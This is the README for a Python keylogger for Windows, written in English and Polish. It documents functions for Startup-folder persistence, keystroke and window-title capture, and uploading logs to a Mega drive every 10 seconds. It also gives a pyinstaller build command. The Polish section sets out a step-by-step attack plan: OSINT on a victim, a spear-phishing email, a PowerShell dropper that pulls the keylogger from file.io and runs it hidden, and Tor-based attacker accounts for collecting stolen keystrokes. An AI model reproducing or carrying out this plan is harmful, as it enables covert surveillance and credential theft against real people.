# Keylogger Designed in Python

## English Documentation

Tested in Windows 10/11.

After starting, the keylogger copies the keylogger executable file (if it does not find it in the startup programs folder) to the folder `C:\Users\<username>\AppData\Roaming\Microsoft\Windows\StartMenu\Programs\Startup`. 

The keylogger saves pressed keys to a text file located in the `C:\Users\<username>\AppData\Local\Temp` folder. Every 10 seconds, the log file is sent to the Mega disk.

The keylogger should be converted to an executable using `py-to-exe`.
exe file should be renamed to variables file_name_to_find
variables to configure
file_name_to_find = "NAME_OF_EXECUTABLE.exe"
email = 'YOUR_EMAIL'
password = 'PASSWORD'
## Keylogger Setup Instructions

1. **Convert the Keylogger to an Executable:**

   Use `py-to-exe` (or `pyinstaller` as an alternative) to convert your Python script to an executable.

   Example command:
   ```bash
   pyinstaller --noconfirm --onefile --windowed "keylogger.py"
## Dokumentacja

### Wykaz i opis części składowych – opracowanych lub adaptowanych

**Keylogger napisany w języku Python**

### Wykorzystane procedury/funkcje keyloggera w Pythonie:

1. `copy_to_startup(source_file)`

   - **Argumenty wejściowe:**
     - `source_file` – string, ścieżka do pliku keyloggera

   - **Wartość zwracana:**
     - brak

   - **Działanie:**
     - Kopiowanie pliku exe keyloggera do katalogu Startup aktualnego użytkownika (jeśli nie jest dodany).

2. `find_file()`

   - **Argumenty wejściowe:**
     - brak

   - **Wartość zwracana:**
     - bezwzględna ścieżka do pliku keyloggera

   - **Działanie:**
     - Szukanie pliku keyloggera w systemie plików oraz zwracanie ścieżki do pliku keyloggera.

3. `upload_to_mega(file_path)`

   - **Argumenty wejściowe:**
     - `file_path` – string, ścieżka do pliku, który zostanie wysłany na dysk Mega (logi)

   - **Wartość zwracana:**
     - brak

   - **Działanie:**
     - Logowanie do dysku Mega i wysyłanie wskazanego pliku na dysk.

4. `add_to_startup()`

   - **Argumenty wejściowe:**
     - brak

   - **Wartość zwracana:**
     - brak

   - **Działanie:**
     - Znajdowanie ścieżki do pliku keyloggera i wywoływanie funkcji `copy_to_startup`.

5. `get_active_window_title()`

   - **Argumenty wejściowe:**
     - brak

   - **Wartość zwracana:**
     - ciąg znaków wskazujący aktywne okno

   - **Działanie:**
     - Odczytywanie i zwracanie nazwy aktywnego okna.

6. `start_keylogger()`

   - **Argumenty wejściowe:**
     - brak

   - **Wartość zwracana:**
     - brak

   - **Działanie:**
     - Rozpoczęcie przechwytywania wpisywanych znaków.

7. `periodic_upload(file_path, interval)`

   - **Argumenty wejściowe:**
     - `file_path` – string, ścieżka do pliku, który zostanie wysłany na dysk Mega (logi)
     - `interval` – czas w sekundach, po którym plik zostanie wysłany na dysk Mega

   - **Wartość zwracana:**
     - brak

   - **Działanie:**
     - Wysyłanie co określony czas pliku na dysk Mega.

8. `on_press(key)`

   - **Argumenty wejściowe:**
     - `key` – typ wyzwalacza wywołujący procedurę `on_press`

   - **Wartość zwracana:**
     - brak

   - **Działanie:**
     - Zapisywanie do pliku tekstowego ciągu wskazującego: wciśnięty klawisz i aktywne okno. Znaki wpisywane w jednym oknie są zapisywane w pojedynczym wierszu pliku.

### Skąd pozyskano kod python – ChatGPT 3

### Krótki opis działania

Po uruchomieniu keylogger kopiuje plik wykonywalny keyloggera (jeśli nie znajduje się w folderze programów uruchomieniowych) do folderu `C:\Users\<username>\AppData\Roaming\Microsoft\Windows\StartMenu\Programs\Startup` użytkownika. Keylogger zapisuje wciśnięte klawisze do pliku tekstowego (plik z logami) znajdującego się w folderze `C:\Users\<username>\AppData\Local\Temp`. Co 10 sekund plik z logami jest wysyłany na dysk Mega.

### Instrukcja instalacji/użytkowania

#### Scenariusze

1. **Instalacji na komputerze ofiary.**
    1. Agent, stosując biały wywiad, zbiera informacje na temat ofiary.
    2. Bazując na informacjach zebranych w poprzednim punkcie, Agent tworzy mail spear phishingowy (np. wykorzystując social engineering toolkit). W załączniku dodaje plik wykonywalny (tworzony podczas punktu ii., podpunkt 6) i wysyła go do ofiary.
        1. Jeśli przesyłanie pliku wykonywalnego jest blokowane, agent przygotowuje inną formę dostarczenia pliku wykonywalnego (np. poprzez użycie narzędzi do kompresji i archiwizacji/udostępnienie pliku wykonywalnego w sieci i wysłanie adresu do pliku w mailu).
    3. Ofiara otwiera mail, pobiera załącznik. Załącznik to plik wykonywalny (szczegóły punkt ii.), który po uruchomieniu wykonuje czynności zgodne z treścią maila spear phishingowego (np. wyświetla obraz/otwiera aplikację/pobiera aktualizację), a także pobiera i uruchamia keylogger (w tle).

2. **Przygotowania mechanizmów dostarczania informacji do napastnika.**
    1. Napastnik otwiera Tor Browser, tworzy konto pocztowe (np. domena interia.pl).
    2. Napastnik tworzy konto na dysku Mega z użyciem konta pocztowego utworzonego w poprzednim punkcie.
    3. Napastnik przekazuje agentowi poświadczenie do konta dysku Mega (komunikacja wyłącznie przez Tor Browser), tak aby agent zmodyfikował poświadczenia do zalogowania do dysku Mega w skrypcie Python (keylogger).
    4. Agent generuje plik wykonywalny ze skryptu Python (keylogger).
    5. Agent udostępnia plik wykonywalny wygenerowany w poprzednim punkcie w sieci, aby można go było pobrać za pomocą komendy `curl`/`Invoke-WebRequest` z PowerShell (np. udostępnia plik w file.io) oraz zapisuje adres pliku.
    6. Agent tworzy skrypt PowerShell, który wykonuje czynności zgodne z treścią maila spear phishingowego (wytworzonego w punkcie i., podpunkt 2). Skrypt PowerShell również pobiera (korzysta z adresu pliku z podpunktu 5) i uruchamia keylogger.
    7. Agent generuje plik wykonywalny (wysłany w załączniku maila w punkcie i., podpunkt 2) ze skryptu PowerShell.

3. **Obsługi odbierania informacji przez napastnika.**
    1. Napastnik otwiera Tor Browser.
    2. Napastnik loguje się na dysk Mega.
    3. Napastnik przegląda pliki, które znajdują się na dysku (logi z wciśniętych klawiszy).
